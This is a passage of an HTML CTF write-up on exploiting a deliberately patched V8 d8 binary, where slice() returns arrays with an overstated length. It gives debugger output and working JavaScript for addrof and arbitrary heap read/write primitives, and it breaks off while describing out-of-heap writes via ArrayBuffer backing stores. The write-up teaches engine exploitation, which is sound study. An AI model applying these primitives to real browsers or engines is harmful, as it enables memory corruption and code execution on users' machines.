@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <meta name="author" content="Seb" />
+  <meta name="dcterms.date" content="2020-09-28" />
+  <title>DownUnderCTF 2020</title>
+  <link id="theme" rel="stylesheet" href="/assets/css/dark.css" />
+  <link rel="icon" type="image/png" size="48x48" href="/assets/images/favicon-48x48.png">
+</head>
+<body>
+<table class="header">
+  <tr>
+    <td colspan="2" rowspan="2" class="width-auto">
+      <h1 class="title">DownUnderCTF 2020</h1>
+      <span class="subtitle"></span>
+    </td>
+    <th>Version</th>
+    <td class="width-min">v1.0.0</td>
+  </tr>
+  <tr>
+    <th>Updated</th>
+    <td class="width-min"><time style="white-space: pre;">2020-09-28</time></td>
+  </tr>
+  <tr>
+    <th class="width-min">Author</th>
+    <td class="width-auto"><a href="/"><cite>Seb</cite></a></td>
+    <td colspan="2" style="text-align: left;" class="width-auto"><a href="/">Home</a></td>
+  </tr>
+</table>
+<label class="theme-toggle-label"><input type="checkbox" class="theme-toggle" /> Theme</label>
+<nav id="TOC" role="doc-toc">
+<h2 id="toc-title">Contents</h2>
+<ul class="incremental">
+<li><a href="#challenge-introduction" id="toc-challenge-introduction">–[
+- Challenge introduction</a></li>
+<li><a href="#the-patch" id="toc-the-patch">–[ - The patch</a></li>
+<li><a href="#anatomy-of-a-jsarray" id="toc-anatomy-of-a-jsarray">–[ -
+Anatomy of a JSArray</a></li>
+<li><a href="#pointer-compression-in-v8"
+id="toc-pointer-compression-in-v8">–[ - Pointer compression in
+v8</a></li>
+<li><a href="#setting-up-our-primitives"
+id="toc-setting-up-our-primitives">–[ - Setting up our
+primitives</a></li>
+<li><a href="#arbitrary-rw-mostly-w-outside-the-v8-heap"
+id="toc-arbitrary-rw-mostly-w-outside-the-v8-heap">–[ - Arbitrary r/w
+(mostly w) outside the v8 heap</a></li>
+<li><a href="#wasm-modules" id="toc-wasm-modules">–[ - WASM
+modules</a></li>
+<li><a href="#putting-it-all-together"
+id="toc-putting-it-all-together">–[ - Putting it all together</a></li>
+</ul>
+</nav>
+<p>This was a great javascript engine exploitation challenge which had a
+nice mix of traditional ctf exploitation elements and v8 specific
+details. Would recommend giving it a go if you’re starting out learning
+about js engines!</p>
+<h3 id="challenge-introduction">–[ - Challenge introduction</h3>
+<figure>
+<img src="chal.jpg" alt="chal" />
+<figcaption aria-hidden="true">chal</figcaption>
+</figure>
+<p>As part of the challenge we are given a patched debug build of <a
+href="https://v8.dev/docs/d8">d8</a>, the v8 developer shell, which
+allows you to run javascript in the v8 engine, easily attach gdb, and
+gives access to some very handy debugging functions.</p>
+<p>We are also given a patch.diff file which highlights the changes made
+to v8 as part of this challenge. If you wish to <a
+href="https://v8.dev/docs/build">build v8</a> with the patch, be sure to
+<code>git apply</code> it to your local v8 repo, however the provided d8
+binary is all we need to complete the challege.</p>
+<p><br></p>
+<h3 id="the-patch">–[ - The patch</h3>
+<p>The important differences were the changes to
+<code>src/builtins/array-slice.tq</code>:</p>
+<pre><code>-        return ExtractFastJSArray(context, a, start, count);
++        // return ExtractFastJSArray(context, a, start, count);
++        // Instead of doing it the usual way, I&#39;ve found out that returning it
++        // the following way gives us a 10x speedup!
++        const array: JSArray = ExtractFastJSArray(context, a, start, count);
++        const newLength: Smi = Cast&lt;Smi&gt;(count - start + SmiConstant(2))
++            otherwise Bailout;
++        array.ChangeLength(newLength);
++        return array;</code></pre>
+<p>Even without much v8 knowledge we can tell that slicing an array will
+give us a different length than what we would normally expect. Let’s see
+this in action in the d8 binary we are given:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a>V8 version <span class="fl">8.7.9</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> a <span class="op">=</span> [<span class="fl">1.1</span><span class="op">,</span> <span class="fl">2.2</span><span class="op">,</span> <span class="fl">3.3</span><span class="op">,</span> <span class="fl">4.4</span>]</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a>[<span class="fl">1.1</span><span class="op">,</span> <span class="fl">2.2</span><span class="op">,</span> <span class="fl">3.3</span><span class="op">,</span> <span class="fl">4.4</span>]</span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> a<span class="op">.</span><span class="at">length</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="dv">4</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> b <span class="op">=</span> a<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)</span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>[<span class="fl">1.1</span><span class="op">,</span> <span class="fl">2.2</span><span class="op">,</span> <span class="fl">3.3</span><span class="op">,</span> <span class="fl">4.4</span><span class="op">,</span> <span class="op">,</span> ]</span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> b<span class="op">.</span><span class="at">length</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="dv">6</span></span></code></pre></div>
+<p>Slicing an array from 0 should give us back the same array (with the
+same length) but here we see array b has a length of 6 instead. What
+happens if we access the two elements at the end of this array?</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode js"><code class="sourceCode javascript"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> b[<span class="dv">4</span>]</span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="fl">4.768128617178215e-270</span></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a>d8<span class="op">&gt;</span> b[<span class="dv">5</span>]</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="fl">2.5530533391e-313</span></span></code></pre></div>
+<p>Those are some unexpected numbers. To understand what exists past the
+end of a JSArray, we should first look at how a JSArray works
+internally.</p>
+<p><br></p>
+<h3 id="anatomy-of-a-jsarray">–[ - Anatomy of a JSArray</h3>
+<p>d8 has some useful inbuilt functions that can be used with the
+<code>--allow-natives-syntax</code> flag, including the
+<code>%DebugPrint</code> function, which shows different information
+about the given parameter. Using these functions in the debug build of
+d8 gives us even more info:</p>
+<pre><code>d8&gt; %DebugPrint(b)
+DebugPrint: 0x307a080862f9: [JSArray]
+ - map: 0x307a082438fd &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]
+ - prototype: 0x307a0820a555 &lt;JSArray[0]&gt;
+ - elements: 0x307a080862d1 &lt;FixedDoubleArray[4]&gt; [PACKED_DOUBLE_ELEMENTS]
+ - length: 6
+ - properties: 0x307a080426dd &lt;FixedArray[0]&gt; {
+    0x307a08044649: [String] in ReadOnlySpace: #length: 0x307a08182159 &lt;AccessorInfo&gt; (const accessor descriptor)
+ }
+ - elements: 0x307a080862d1 &lt;FixedDoubleArray[4]&gt; {
+           0: 1.1
+           1: 2.2
+           2: 3.3
+           3: 4.4
+ }
+0x307a082438fd: [Map]
+ - type: JS_ARRAY_TYPE
+ - instance size: 16
+ - inobject properties: 0
+ - elements kind: PACKED_DOUBLE_ELEMENTS
+ - unused property fields: 0
+ - enum length: invalid
+ - back pointer: 0x307a082438d5 &lt;Map(HOLEY_SMI_ELEMENTS)&gt;
+ - prototype_validity cell: 0x307a08182445 &lt;Cell value= 1&gt;
+ - instance descriptors #1: 0x307a0820abd9 &lt;DescriptorArray[1]&gt;
+ - transitions #1: 0x307a0820ac25 &lt;TransitionArray[4]&gt;Transition array #1:
+     0x307a08044f5d &lt;Symbol: (elements_transition_symbol)&gt;: (transition to HOLEY_DOUBLE_ELEMENTS) -&gt; 0x307a08243925 &lt;Map(HOLEY_DOUBLE_ELEMENTS)&gt;
+
+ - prototype: 0x307a0820a555 &lt;JSArray[0]&gt;
+ - constructor: 0x307a0820a429 &lt;JSFunction Array (sfi = 0x307a0818b399)&gt;
+ - dependent code: 0x307a080421e1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;
+ - construction counter: 0
+
+[1.1, 2.2, 3.3, 4.4, , ]</code></pre>
+<p>That’s a lot of info, but for the purposes of this writeup we will
+focus on the <code>map</code> and <code>elements</code> members. Before
+getting to that, lets see what the memory around a JSArray looks like to
+start building some context.</p>
+<p>To look at <em>that</em> we need to touch on how pointers are
+represented in v8- pointers are distinguished from other numbers by
+having their least significant bit set to 1. Therefore, the memory we
+should access from the <code>%DebugPrint</code> is
+<code>0x307a080862f9-0x1</code></p>
+<p>JSArray <code>b</code></p>
+<pre><code>gef➤  x/4gx 0x307a080862f9-0x1
+0x307a080862f8: 0x080426dd082438fd  0x0000000c080862d1
+0x307a08086308: 0x080426dd0824394d  0x0000000c08086341</code></pre>
+<p>That doesn’t <em>exactly</em> look like the output from
+<code>%DebugPrint</code>, but looking at the least significant 32 bits
+and comparing to the ‘real’ pointers:</p>
+<pre><code>map:            0x307a082438fd
+elements:       0x307a080862d1</code></pre>
+<p>The first member of the JSArray corresponds to the map pointer, and
+second corresponds to the elements pointer. These values are different
+because of pointer compression in v8, which we’ll briefly touch on soon.
+For now it’s enough to know what the first two members of a JSArray
+correspond to.</p>
+<p>Before moving on, it’s also worthwhile looking at <em>where</em> the
+elements pointer points to:</p>
+<pre><code>gef➤  x/8gx 0x307a080862d1-0x1
+0x307a080862d0: 0x0000000808042a31  0x3ff199999999999a
+0x307a080862e0: 0x400199999999999a  0x400a666666666666
+0x307a080862f0: 0x401199999999999a  0x080426dd082438fd
+0x307a08086300: 0x0000000c080862d1  0x080426dd0824394d</code></pre>
+<p>We can see all of our float values in there, and can identify the
+last one as <code>0x401199999999999a</code>:</p>
+<pre><code>gef➤  p/f 0x401199999999999a
+$1 = 4.4000000000000004</code></pre>
+<p>The memory blocks after the 4.4 look familiar! Indeed, we have run
+into the start of our JSArray.</p>
+<p>The memory structure looks something like this:</p>
+<pre><code>                  +-------------+-------------+
+   0x307a080862d0 |             |             |
+          +------&gt;|             |   1.1       |
+          |       +---------------------------+
+          |       |             |             |
+          |       |    2.2      |   3.3       |
+          |       +---------------------------+
+          |       |             |  float_arr  |  0x307a080862f8
+          |       |    4.4      |     map     |  JSArray start
+          |       +---------------------------+
+          |       | elements    |             |
+          +-------+   ptr       |             |
+                  +-------------+-------------+
+</code></pre>
+<p>We can finally answer the question of what exists at the end of a
+JSArray (specifically past the end of where its elements are stored):
+The JSArray itself!</p>
+<p>So the values we were printing out at <code>b[4]</code> and
+<code>b[5]</code> corresponded to the map and elements pointer values
+for the <code>b</code> JSArray</p>
+<p>Note that in this case our elements are of the type
+<code>PACKED_DOUBLE_ELEMENTS</code> If we were to add elements past the
+length of our array normally the actual elements array would be
+reallocated elsewhere. However the length of our array has been extended
+to cover these pointers, so we can access them freely.</p>
+<p><br></p>
+<h4 id="maps">–[ - Maps</h4>
+<p>The map member contains several pieces of data, but importantly for
+us it determines how data in the array is accessed- For example,
+accessing something in a float array is different to accessing an
+element in an array of objects.</p>
+<p>For further details on maps and other cool JS related information, <a
+href="http://www.phrack.org/papers/jit_exploitation.html">this</a>
+article by saelo is a great read.</p>
+<p>For the challenge, all we really need to know is that the map for a
+float array will cause the elements to be accessed directly as they are
+stored in the elements pointer, while the map of an object array will
+treat the values in the elements pointer as pointers to other
+objects.</p>
+<p><br></p>
+<h3 id="pointer-compression-in-v8">–[ - Pointer compression in v8</h3>
+<p>Pointer compression is described well <a
+href="https://blog.infosectcbr.com.au/2020/02/pointer-compression-in-v8.html">here</a>
+for the interested reader.</p>
+<p>Basically, the lower 32 bits of an address in the v8 heap are
+combined with another number (the isolate root) stored elsewhere to
+create an actual memory reference.</p>
+<p>What this means for us is that we won’t know the actual address of
+anything in the v8 heap, but we don’t really <em>need</em> to know their
+actual address, just the compressed pointer.</p>
+<p>Accessing elements in a JSArray is done through its ‘compressed’
+elements pointer, so if we had control of this elements pointer we could
+point it and achieve a r/w primitive anywhere within its own heap- we
+don’t need to know the isolate root value because its handled
+automatically for us.</p>
+<p>Writing <em>outside</em> the v8 heap requires a little more work, but
+not much. <br></p>
+<h3 id="setting-up-our-primitives">–[ - Setting up our primitives</h3>
+<p>We have all the information we really need to start writing some
+useful primitives. Two of the common ones for v8 exploitation are
+<code>addrof</code> and <code>fakeobj</code>. <code>addrof</code> is
+used to return the address of some desired object, and
+<code>fakeobj</code> is used to create a fake object at a desired
+address, which might further be used for arbitrary r/w. We won’t be
+creating a <code>fakeobj</code> primitive because the challenge gives us
+an easy way to do r/w. <code>addrof</code> will still be useful.</p>
+<p><br></p>
+<h4 id="setup">–[ - Setup</h4>
+<p>Here are some helper functions (yoinked from one of Faith’s <a
+href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">writeups</a>
+(thanks)) used for converting between ints and floats in the
+exploit:</p>
+<div class="sourceCode" id="cb10"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb10-1"><a href="#cb10-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">ArrayBuffer</span>(<span class="dv">8</span>)<span class="op">;</span> <span class="co">// 8 byte array buffer</span></span>
+<span id="cb10-2"><a href="#cb10-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> f64_buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">Float64Array</span>(buf)<span class="op">;</span></span>
+<span id="cb10-3"><a href="#cb10-3" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> u64_buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint32Array</span>(buf)<span class="op">;</span></span>
+<span id="cb10-4"><a href="#cb10-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-5"><a href="#cb10-5" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">ftoi</span>(val) { <span class="co">// typeof(val) == float</span></span>
+<span id="cb10-6"><a href="#cb10-6" aria-hidden="true" tabindex="-1"></a>    f64_buf[<span class="dv">0</span>] <span class="op">=</span> val<span class="op">;</span></span>
+<span id="cb10-7"><a href="#cb10-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="bu">BigInt</span>(u64_buf[<span class="dv">0</span>]) <span class="op">+</span> (<span class="bu">BigInt</span>(u64_buf[<span class="dv">1</span>]) <span class="op">&lt;&lt;</span> <span class="dv">32</span>n)<span class="op">;</span> <span class="co">// Watch for little endianness</span></span>
+<span id="cb10-8"><a href="#cb10-8" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb10-9"><a href="#cb10-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb10-10"><a href="#cb10-10" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">itof</span>(val) { <span class="co">// typeof(val) == BigInt</span></span>
+<span id="cb10-11"><a href="#cb10-11" aria-hidden="true" tabindex="-1"></a>    u64_buf[<span class="dv">0</span>] <span class="op">=</span> <span class="bu">Number</span>(val <span class="op">&amp;</span> <span class="bn">0xffffffff</span>n)<span class="op">;</span></span>
+<span id="cb10-12"><a href="#cb10-12" aria-hidden="true" tabindex="-1"></a>    u64_buf[<span class="dv">1</span>] <span class="op">=</span> <span class="bu">Number</span>(val <span class="op">&gt;&gt;</span> <span class="dv">32</span>n)<span class="op">;</span></span>
+<span id="cb10-13"><a href="#cb10-13" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> f64_buf[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb10-14"><a href="#cb10-14" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p>First we setup some initial arrays to use and trigger the
+vulnerability:</p>
+<div class="sourceCode" id="cb11"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb11-1"><a href="#cb11-1" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-2"><a href="#cb11-2" aria-hidden="true" tabindex="-1"></a>a <span class="op">=</span> [<span class="fl">1.1</span><span class="op">,</span> <span class="fl">2.2</span><span class="op">,</span> <span class="fl">3.3</span>]<span class="op">;</span></span>
+<span id="cb11-3"><a href="#cb11-3" aria-hidden="true" tabindex="-1"></a>b <span class="op">=</span> [{<span class="dt">A</span><span class="op">:</span><span class="dv">1</span>}<span class="op">,</span> {<span class="dt">B</span><span class="op">:</span><span class="dv">2</span>}<span class="op">,</span> {<span class="dt">C</span><span class="op">:</span><span class="dv">3</span>}]<span class="op">;</span></span>
+<span id="cb11-4"><a href="#cb11-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb11-5"><a href="#cb11-5" aria-hidden="true" tabindex="-1"></a>float_arr <span class="op">=</span> a<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb11-6"><a href="#cb11-6" aria-hidden="true" tabindex="-1"></a>obj_arr <span class="op">=</span> b<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)<span class="op">;</span></span></code></pre></div>
+<p>In this case <code>float_arr.length</code> will be 5, allowing us to
+access it’s map and elements pointers. The map pointer won’t be used in
+this exploit, but modifying it (to say, the same as an object map) would
+also allow for some fun exploits. <a
+href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Here</a>
+is a cool ctf writeup involving playing around with different maps.</p>
+<p>Also note that the slice vuln is also triggered on
+<code>obj_arr</code>, but isn’t used in the exploit.</p>
+<p>As discussed, the float map and elements pointers can now be directly
+accessed:</p>
+<div class="sourceCode" id="cb12"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true" tabindex="-1"></a>float_map <span class="op">=</span> float_arr[<span class="dv">3</span>]<span class="op">;</span></span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true" tabindex="-1"></a>float_elems <span class="op">=</span> float_arr[<span class="dv">4</span>]<span class="op">;</span></span></code></pre></div>
+<p>Because of the deterministic heap layout we can find out (e.g. with
+gdb) what values our object map+elements pointers will have using the
+float values we already know.</p>
+<p>In this case, I found that the object pointer will have a value of
+<code>float_map + 0x50</code> and the object elements pointer will have
+a value of <code>float_elems + 0x30</code>:</p>
+<div class="sourceCode" id="cb13"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true" tabindex="-1"></a>obj_map <span class="op">=</span> <span class="fu">itof</span>(<span class="fu">ftoi</span>(float_map) <span class="op">+</span> (<span class="bn">0x50</span>n))<span class="op">;</span></span>
+<span id="cb13-2"><a href="#cb13-2" aria-hidden="true" tabindex="-1"></a>obj_elems <span class="op">=</span> <span class="fu">itof</span>(<span class="fu">ftoi</span>(float_elems) <span class="op">+</span> (<span class="bn">0x30</span>n))<span class="op">;</span></span></code></pre></div>
+<p>We can now construct our <code>addrof</code> primitive.</p>
+<p><br></p>
+<h4 id="addrof">–[ - Addrof</h4>
+<p>Because we have control the the float array’s elements pointer, we
+can set it to whatever value we want. We know the value of the object
+array’s elements pointer, so what would happen if we set it to that?</p>
+<p>Both the float and object array would then have their elements in the
+same place, but each will access them differently.</p>
+<pre><code>                 obj_arr                       float_arr
+         +----------+---------+            +-----------+---------+
+         |  map     | elems   |            | map       |elems    |
+         |          |         |            |           |         |
+         +----------+-----+---+            +-----------+-----+---+
+                          |                                  |
+                          +-----+----------------------------+
+                                |
+                                v
+                          +--------------+
+                          | obj ptr1     |+---&gt;  {A:1.1}
+                          +--------------+
+                          | obj ptr2     |+---&gt;  {B:2.2}
+                          +--------------+
+                          |  ...         |
+                          |              |
+                          |              |
+                          |              |
+                          +--------------+
+</code></pre>
+<p>For example, the value at <code>obj_arr[0]</code> is a pointer to an
+object, and accessing it through the <code>obj_arr</code> will treat it
+like an object (because of its map!) <code>float_arr</code> has a
+different map, that means accessing <code>float_arr[0]</code> will
+simply treat the object pointer there as a float value.</p>
+<p>Therefore we can stick any object we want into <code>obj_arr</code>,
+then accessing it through <code>float_arr</code> will give us its
+pointer.</p>
+<p>Here is our primitive:</p>
+<div class="sourceCode" id="cb15"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">addrof</span>(in_obj) {</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true" tabindex="-1"></a>        <span class="co">// put the obj into our object array</span></span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true" tabindex="-1"></a>        obj_arr[<span class="dv">0</span>] <span class="op">=</span> in_obj<span class="op">;</span></span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true" tabindex="-1"></a>        <span class="co">// accessing the first element of the float array</span></span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true" tabindex="-1"></a>        <span class="co">// treats the value there as a float:</span></span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true" tabindex="-1"></a>        <span class="kw">let</span> addr <span class="op">=</span> float_arr[<span class="dv">0</span>]<span class="op">;</span></span>
+<span id="cb15-8"><a href="#cb15-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb15-9"><a href="#cb15-9" aria-hidden="true" tabindex="-1"></a>        <span class="co">// Convert to bigint</span></span>
+<span id="cb15-10"><a href="#cb15-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">return</span> <span class="fu">ftoi</span>(addr)<span class="op">;</span></span>
+<span id="cb15-11"><a href="#cb15-11" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p><br></p>
+<h4 id="arbitrary-readwrite-within-v8-heap">–[ - Arbitrary read/write
+within v8 heap</h4>
+<p>From what we have so far, building an arbitrary r/w is fairly
+straightforward since we have direct control over the elements pointer
+of a JSArray- we can simply point it to the area we want to r/w from.
+However, because of pointer compression this can only be done within the
+v8 heap.</p>
+<div class="sourceCode" id="cb16"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">arb_r</span>(addr) { <span class="co">// typeof(addr) == BigInt</span></span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true" tabindex="-1"></a>    t <span class="op">=</span> [<span class="fl">1.1</span>]</span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true" tabindex="-1"></a>    <span class="co">// read is performed at addr + 0x8</span></span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true" tabindex="-1"></a>    addr <span class="op">=</span> addr <span class="op">-</span> <span class="bn">0x8</span>n</span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ensure addr is tagged as a pointer</span></span>
+<span id="cb16-7"><a href="#cb16-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (addr <span class="op">%</span> <span class="dv">2</span>n <span class="op">==</span> <span class="dv">0</span>) {</span>
+<span id="cb16-8"><a href="#cb16-8" aria-hidden="true" tabindex="-1"></a>                addr <span class="op">+=</span> <span class="dv">1</span>n<span class="op">;</span></span>
+<span id="cb16-9"><a href="#cb16-9" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb16-10"><a href="#cb16-10" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb16-11"><a href="#cb16-11" aria-hidden="true" tabindex="-1"></a>    <span class="co">// trigger the vuln</span></span>
+<span id="cb16-12"><a href="#cb16-12" aria-hidden="true" tabindex="-1"></a>    tmp_arr <span class="op">=</span> t<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)</span>
+<span id="cb16-13"><a href="#cb16-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-14"><a href="#cb16-14" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set elem ptr to desired address</span></span>
+<span id="cb16-15"><a href="#cb16-15" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">2</span>] <span class="op">=</span> <span class="fu">itof</span>(addr)</span>
+<span id="cb16-16"><a href="#cb16-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-17"><a href="#cb16-17" aria-hidden="true" tabindex="-1"></a>    <span class="co">// return value there as a BigInt</span></span>
+<span id="cb16-18"><a href="#cb16-18" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="fu">ftoi</span>(tmp_arr[<span class="dv">0</span>])</span>
+<span id="cb16-19"><a href="#cb16-19" aria-hidden="true" tabindex="-1"></a>}</span>
+<span id="cb16-20"><a href="#cb16-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-21"><a href="#cb16-21" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> <span class="fu">arb_w</span>(addr<span class="op">,</span> val) { <span class="co">// both as BigInts</span></span>
+<span id="cb16-22"><a href="#cb16-22" aria-hidden="true" tabindex="-1"></a>    t <span class="op">=</span> [<span class="fl">1.1</span>]</span>
+<span id="cb16-23"><a href="#cb16-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-24"><a href="#cb16-24" aria-hidden="true" tabindex="-1"></a>    <span class="co">// write is made at addr + 0x8</span></span>
+<span id="cb16-25"><a href="#cb16-25" aria-hidden="true" tabindex="-1"></a>    addr <span class="op">=</span> addr <span class="op">-</span> <span class="bn">0x8</span>n</span>
+<span id="cb16-26"><a href="#cb16-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-27"><a href="#cb16-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">// ensure addr is tagged</span></span>
+<span id="cb16-28"><a href="#cb16-28" aria-hidden="true" tabindex="-1"></a>    <span class="cf">if</span> (addr <span class="op">%</span> <span class="dv">2</span>n <span class="op">==</span> <span class="dv">0</span>) {</span>
+<span id="cb16-29"><a href="#cb16-29" aria-hidden="true" tabindex="-1"></a>                addr <span class="op">+=</span> <span class="dv">1</span>n<span class="op">;</span></span>
+<span id="cb16-30"><a href="#cb16-30" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb16-31"><a href="#cb16-31" aria-hidden="true" tabindex="-1"></a>    </span>
+<span id="cb16-32"><a href="#cb16-32" aria-hidden="true" tabindex="-1"></a>    <span class="co">// trigger the vuln</span></span>
+<span id="cb16-33"><a href="#cb16-33" aria-hidden="true" tabindex="-1"></a>    tmp_arr <span class="op">=</span> t<span class="op">.</span><span class="fu">slice</span>(<span class="dv">0</span>)</span>
+<span id="cb16-34"><a href="#cb16-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-35"><a href="#cb16-35" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set elem ptr to desired address</span></span>
+<span id="cb16-36"><a href="#cb16-36" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">2</span>] <span class="op">=</span> <span class="fu">itof</span>(addr)</span>
+<span id="cb16-37"><a href="#cb16-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb16-38"><a href="#cb16-38" aria-hidden="true" tabindex="-1"></a>    <span class="co">// set addr to desired value</span></span>
+<span id="cb16-39"><a href="#cb16-39" aria-hidden="true" tabindex="-1"></a>    tmp_arr[<span class="dv">0</span>] <span class="op">=</span> <span class="fu">itof</span>(val)</span>
+<span id="cb16-40"><a href="#cb16-40" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div>
+<p><br></p>
+<h3 id="arbitrary-rw-mostly-w-outside-the-v8-heap">–[ - Arbitrary r/w
+(mostly w) outside the v8 heap</h3>
+<p>To achieve r/w outside the v8 heap, we can use <a
+href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/TypedArray">typed
+arrays</a></p>
+<div class="sourceCode" id="cb17"><pre
+class="sourceCode js"><code class="sourceCode javascript"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> buf <span class="op">=</span> <span class="kw">new</span> <span class="bu">ArrayBuffer</span>(<span class="bn">0x100</span>)</span>
+<span id="cb17-2"><a href="#cb17-2" aria-hidden="true" tabindex="-1"></a><span class="kw">var</span> uint8_arr <span class="op">=</span> <span class="kw">new</span> <span class="bu">Uint8Array</span>(buf)</span></code></pre></div>
+<p>Here <code>buf</code> is another object within the v8 heap (and thus
+in scope of our existing r/w functions). However its backing store (the
+place where the <code>uint8_arr</code> will store its elements) will
+exist outside the v8 heap (this it will be identified by an ‘absolute’
+64bit pointer).</p>
+<pre><code>                v8 heap                          &#39;actual&#39; heap
+        +----------------------------+        +---------------------+
+        |                            |        |                     |
+        |  buf    +--------------+   |      +--&gt;                    |
+        |         |              |   |      | |                     |
+        |         |   . . .      |   |      | |                     |
+        |         |              |   |      | +---------------------+
+        |         |              |   |      |
+        |         +--------------+   |      |
+        |         |  backing     |   |      |
+        |         |  store ptr   +----------+
+        |         +--------------+   |
+        +----------------------------+
+</code></pre>
+<p>Luckily this absolute backing store pointer exists at a constant
+offset within <code>buf</code>, so if we know the address of
+<code>buf</code> in the v8 heap we can use our existing r/w primitives
+to modify the backing store pointer.</p>
+<p>After modifying this backing store pointer, any accesses to
+<code>uint8_arr</code> will happen at our chosen address- this means we
